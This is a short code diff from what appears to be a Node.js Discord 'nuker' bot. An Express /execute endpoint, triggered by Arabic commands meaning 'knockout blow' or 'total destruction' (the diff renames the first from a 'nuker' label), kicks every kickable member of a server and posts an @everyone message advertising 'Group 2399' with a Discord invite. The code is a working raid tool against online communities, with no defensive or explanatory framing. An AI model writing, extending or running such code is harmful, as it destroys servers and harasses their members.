@@ -21,7 +21,7 @@ app.post('/execute', async (req, res) => {
         const guild = await client.guilds.fetch(guildId);
         const msg = "# Group 2399 is here\nhttps://discord.gg/DcKVbTkW8 @everyone";
 
-        if (action === ' nuker الجميع' || action === 'تدمير شامل') {
+        if (action === 'الضربة القاضية' || action === 'تدمير شامل') {
             // 1. طرد الجميع
             const members = await guild.members.fetch();
             members.forEach(m => { if(m.kickable) m.kick('2399 Power').catch(() => {}); });
